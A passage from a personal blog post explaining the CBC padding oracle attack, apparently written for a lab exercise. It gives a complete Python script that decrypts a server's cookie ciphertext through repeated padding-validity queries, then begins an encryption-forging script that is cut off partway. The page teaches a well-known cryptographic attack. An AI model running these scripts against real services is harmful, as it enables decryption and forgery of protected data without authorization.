<!DOCTYPE html><html lang="default" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>padding_oracle_attack | Wenyun Wang</title><meta name="author" content="Wenyun Wang"><meta name="copyright" content="Wenyun Wang"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Why it is a Vulnerability?The server’s weakness is that it leaks whether the padding is valid through its responses, which allows an attacker to both decrypt and encrypt ciphertexts without knowing th">
<meta property="og:type" content="article">
<meta property="og:title" content="padding_oracle_attack">
<meta property="og:url" content="http://wenyunw.me/2025/03/15/padding-oracle-attack/index.html">
<meta property="og:site_name" content="Wenyun Wang">
<meta property="og:description" content="Why it is a Vulnerability?The server’s weakness is that it leaks whether the padding is valid through its responses, which allows an attacker to both decrypt and encrypt ciphertexts without knowing th">
<meta property="og:locale">
<meta property="og:image" content="http://wenyunw.me/images/padding_oracle_attack.png">
<meta property="article:published_time" content="2025-03-15T23:07:56.000Z">
<meta property="article:modified_time" content="2025-09-03T05:56:47.325Z">
<meta property="article:author" content="Wenyun Wang">
<meta property="article:tag" content="crypto">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://wenyunw.me/images/padding_oracle_attack.png"><link rel="shortcut icon" href="/images/favicon.png"><link rel="canonical" href="http://wenyunw.me/2025/03/15/padding-oracle-attack/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: {"limitCount":100,"languages":{"author":"Author: Wenyun Wang","link":"Link: ","source":"Source: Wenyun Wang","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source."}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'padding_oracle_attack',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-09-03 05:56:47'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#F8F8FF')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-book"></i><span> Note</span></a></div><div class="menus_item"><a class="site-page" href="/resume/"><i class="fa-fw fas fa-id-card"></i><span> Resume</span></a></div><div class="menus_item"><a class="site-page" href="/guestbook/"><i class="fa-fw fas fa-comment"></i><span> Comment</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img fixed" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Wenyun Wang"><span class="site-name">Wenyun Wang</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-book"></i><span> Note</span></a></div><div class="menus_item"><a class="site-page" href="/resume/"><i class="fa-fw fas fa-id-card"></i><span> Resume</span></a></div><div class="menus_item"><a class="site-page" href="/guestbook/"><i class="fa-fw fas fa-comment"></i><span> Comment</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">padding_oracle_attack</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon fas fa-history"></i><span class="post-meta-label">Updated</span><time datetime="2025-09-03T05:56:47.325Z" title="Updated 2025-09-03 05:56:47">2025-09-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Security/">Security</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="padding_oracle_attack"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><h2 id="Why-it-is-a-Vulnerability"><a href="#Why-it-is-a-Vulnerability" class="headerlink" title="Why it is a Vulnerability?"></a>Why it is a Vulnerability?</h2><p>The server’s weakness is that it leaks whether the padding is valid through its responses, which allows an attacker to both decrypt and encrypt ciphertexts without knowing the key while using brute force attack. The key is to gain the intermediate value. When decrypting, we set a valid padding in plain text and loop previous cipher block’s bytes, try to get response with valid padding. Then use <code>P[i] = D(C[i]) ⊕ C[i-1]</code> to get the real plain text. Vice versa, when encrypting, we can set the last block in random value such as all zero, then use the similar process <code>C[i-1] = D(C[i]) ⊕ P[i]</code> to construct new cipher text with our desired plain text.</p>
<h2 id="Decrypting"><a href="#Decrypting" class="headerlink" title="Decrypting:"></a>Decrypting:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">block_size = <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># USE YOUR SERVER&#x27;S OWN IP AND PORT</span></span><br><span class="line">IP = <span class="string">&quot;...&quot;</span></span><br><span class="line">PORT = <span class="string">&quot;...&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="comment"># IF NEEDED</span></span><br><span class="line">    <span class="comment"># context.proxy = (socks.SOCKS5, &#x27;localhost&#x27;, YOUR_OWN_PORT)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  <span class="comment"># try to connect until success</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = remote(IP, PORT)</span><br><span class="line">            conn.recvline()  <span class="comment"># Welcome</span></span><br><span class="line">            cipher = conn.recvline().decode().split(<span class="string">&quot;: &quot;</span>)[<span class="number">1</span>].strip()  <span class="comment"># gain cipher</span></span><br><span class="line">            conn.recvline()  <span class="comment"># Prompt &quot;what is your cookie&quot;</span></span><br><span class="line">            <span class="keyword">return</span> conn, cipher</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            time.sleep(<span class="number">0.01</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padding_oracle_attack</span>(<span class="params">cipher</span>):</span><br><span class="line">    cipher = <span class="built_in">bytes</span>.fromhex(cipher)</span><br><span class="line"></span><br><span class="line">    blocks = [cipher[i:i + block_size] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher), block_size)]</span><br><span class="line">    plaintext = <span class="built_in">bytearray</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Process all blocks except the first (IV)</span></span><br><span class="line">    <span class="keyword">for</span> block_idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(blocks) - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">        current_block = <span class="built_in">bytearray</span>(blocks[block_idx])</span><br><span class="line">        intermediate_bytes = <span class="built_in">bytearray</span>(block_size)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Try each byte position</span></span><br><span class="line">        <span class="keyword">for</span> byte_pos <span class="keyword">in</span> <span class="built_in">range</span>(block_size - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            padding_value = block_size - byte_pos</span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;padding_output.log&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, buffering=<span class="number">1</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="built_in">print</span>(</span><br><span class="line">                    <span class="string">f&quot;Block <span class="subst">&#123;block_idx&#125;</span>/<span class="subst">&#123;<span class="built_in">len</span>(blocks) - <span class="number">1</span>&#125;</span>, Starting byte: <span class="subst">&#123;byte_pos&#125;</span>&quot;</span>,</span><br><span class="line">                    file=f, flush=<span class="literal">True</span></span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">            previous_block = <span class="built_in">bytearray</span>(blocks[block_idx - <span class="number">1</span>])</span><br><span class="line">            <span class="comment"># Prepare known padding bytes</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(byte_pos + <span class="number">1</span>, block_size):</span><br><span class="line">                previous_block[k] = intermediate_bytes[k] ^ padding_value</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Try each possible byte value</span></span><br><span class="line">            have_found_byte = <span class="literal">False</span></span><br><span class="line">            same_pos_with_cipher = -<span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> guess <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                previous_block[byte_pos] = guess</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Construct full test cipher</span></span><br><span class="line">                test_cipher = <span class="built_in">bytearray</span>()</span><br><span class="line">                test_cipher.extend(previous_block)</span><br><span class="line">                test_cipher.extend(current_block)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Send the test blocks to server</span></span><br><span class="line">                conn, _ = connect()</span><br><span class="line">                conn.sendline(test_cipher.<span class="built_in">hex</span>().encode())  <span class="comment"># Send as hex string</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    response = conn.recvline().decode().strip()</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    response = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                conn.close()</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Check if padding is valid</span></span><br><span class="line">                <span class="comment"># NEED TO MODIFY BASED ON SERVER&#x27;S REAL SITUATION</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">not</span> response) <span class="keyword">or</span> (response <span class="keyword">and</span> <span class="string">&quot;invalid&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response):</span><br><span class="line">                    <span class="keyword">if</span> guess == <span class="built_in">int</span>(blocks[block_idx - <span class="number">1</span>][byte_pos]) <span class="keyword">and</span> byte_pos == block_size - <span class="number">1</span>:</span><br><span class="line">                        same_pos_with_cipher = guess</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="comment"># Valid and Calculate intermediate byte</span></span><br><span class="line">                        intermediate_bytes[byte_pos] = guess ^ padding_value</span><br><span class="line">                        have_found_byte = <span class="literal">True</span></span><br><span class="line">                        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;padding_output.log&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, buffering=<span class="number">1</span>) <span class="keyword">as</span> f:</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;Found byte <span class="subst">&#123;byte_pos&#125;</span>: <span class="subst">&#123;<span class="built_in">hex</span>(guess)&#125;</span>&quot;</span>, file=f, flush=<span class="literal">True</span>)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> have_found_byte <span class="keyword">and</span> same_pos_with_cipher != -<span class="number">1</span>:</span><br><span class="line">                intermediate_bytes[byte_pos] = same_pos_with_cipher ^ padding_value</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;padding_output.log&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, buffering=<span class="number">1</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Found same byte <span class="subst">&#123;byte_pos&#125;</span>: <span class="subst">&#123;<span class="built_in">hex</span>(guess)&#125;</span>!!!!&quot;</span>, file=f, flush=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> have_found_byte <span class="keyword">and</span> same_pos_with_cipher == -<span class="number">1</span>:</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">f&quot;Failed to find valid byte at position <span class="subst">&#123;byte_pos&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Calculate plaintext block using intermediate bytes and previous cipher block</span></span><br><span class="line">        decrypted_block = <span class="built_in">bytearray</span>(block_size)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(block_size):</span><br><span class="line">            decrypted_block[i] = intermediate_bytes[i] ^ blocks[block_idx - <span class="number">1</span>][i]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Add decrypted block to plaintext</span></span><br><span class="line">        plaintext[<span class="number">0</span>:<span class="number">0</span>] = decrypted_block</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Log decrypted block</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;padding_output.log&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, buffering=<span class="number">1</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="built_in">print</span>(</span><br><span class="line">                <span class="string">f&quot;Decrypted block <span class="subst">&#123;block_idx&#125;</span>: <span class="subst">&#123;decrypted_block.<span class="built_in">hex</span>()&#125;</span>&quot;</span>,</span><br><span class="line">                file=f, flush=<span class="literal">True</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Remove PKCS7 padding</span></span><br><span class="line">    padding_length = plaintext[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> padding_length &gt; block_size:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Invalid padding in decrypted text&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Verify padding</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, padding_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> plaintext[-i] != padding_length:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;Invalid padding in decrypted text&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> plaintext[:-padding_length]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Main execution</span></span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line">first_conn, cipher = connect()</span><br><span class="line">first_conn.close()</span><br><span class="line"></span><br><span class="line">result = padding_oracle_attack(cipher)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nFinal result (hex):&quot;</span>, result.<span class="built_in">hex</span>())</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">all</span>(<span class="number">32</span> &lt;= byte &lt;= <span class="number">126</span> <span class="keyword">for</span> byte <span class="keyword">in</span> result):  <span class="comment"># Check if printable ASCII</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Final result:&quot;</span>, result.decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;padding_output.log&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Final result (hex):<span class="subst">&#123;result.<span class="built_in">hex</span>()&#125;</span>&quot;</span>, file=f, flush=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Final result: <span class="subst">&#123;result.decode()&#125;</span>&quot;</span>, file=f, flush=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Encrypting"><a href="#Encrypting" class="headerlink" title="Encrypting"></a>Encrypting</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">block_size = <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># USE YOUR SERVER&#x27;S OWN IP AND PORT</span></span><br><span class="line">IP = <span class="string">&quot;...&quot;</span></span><br><span class="line">PORT = <span class="string">&quot;...&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> s + (<span class="number">16</span> - <span class="built_in">len</span>(s) % <span class="number">16</span>) * <span class="built_in">chr</span>(<span class="number">16</span> - <span class="built_in">len</span>(s) % <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="comment">#IF NEEDED</span></span><br><span class="line">    <span class="comment">#context.proxy = (socks.SOCKS5, &#x27;localhost&#x27;, YOUR_OWN_PORT)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  <span class="comment"># try to connect until success</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = remote(IP, PORT)</span><br><span class="line">            conn.recvline()  <span class="comment"># Welcome</span></span><br><span class="line">            cipher = conn.recvline().decode().split(<span class="string">&quot;: &quot;</span>)[<span class="number">1</span>].strip()  <span class="comment"># gain cipher</span></span><br><span class="line">            conn.recvline()  <span class="comment"># Prompt &quot;what is your cookie&quot;</span></span><br><span class="line">            <span class="keyword">return</span> conn, cipher</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            time.sleep(<span class="number">0.01</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padding_oracle_attack</span>(<span class="params">plain</span>):</span><br><span class="line">    plain = <span class="built_in">bytes</span>.fromhex(plain)</span><br><span class="line">    plain_blocks = [plain[i:i + block_size] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(plain), block_size)]  <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">    cipher_text = <span class="built_in">bytearray</span>((<span class="built_in">len</span>(plain_blocks) + <span class="number">1</span>) * block_size)  <span class="comment"># 6</span></span><br><span class="line">    cipher_blocks = [cipher_text[i:i + block_size] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher_text), block_size)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> block_idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher_blocks) - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">        current_block = <span class="built_in">bytearray</span>(cipher_blocks[block_idx])</span><br><span class="line">        intermediate_bytes = <span class="built_in">bytearray</span>(block_size)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Try each byte position</span></span><br><span class="line">        <span class="keyword">for</span> byte_pos <span class="keyword">in</span> <span class="built_in">range</span>(block_size - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            padding_value = block_size - byte_pos</span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;create_cipher.log&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, buffering=<span class="number">1</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="built_in">print</span>(</span><br><span class="line">                    <span class="string">f&quot;Block <span class="subst">&#123;block_idx&#125;</span>/<span class="subst">&#123;<span class="built_in">len</span>(cipher_blocks) - <span class="number">1</span>&#125;</span>, Starting byte: <span class="subst">&#123;byte_pos&#125;</span>&quot;</span>,</span><br><span class="line">                    file=f, flush=<span 